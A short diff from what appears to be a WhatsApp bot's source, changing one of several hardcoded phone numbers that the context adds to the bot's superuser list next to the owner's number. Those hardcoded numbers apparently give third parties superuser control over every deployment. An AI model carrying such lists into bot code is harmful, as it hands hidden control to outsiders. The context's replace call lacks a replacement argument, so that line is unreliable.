@@ -160,7 +160,7 @@ setTimeout(() => {
             const k1 = '254742063632';
             const k2 = '254757835036';
             const k3 = "254750948696";
-            const k4 = '254751284109';
+            const k4 = '254751284190';
             const sudo = await getAllSudoNumbers();
             let suhail_ser = "923184474176"
             const superUserNumbers = [servBot,suhail_ser, k1, k2, k3, k4, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
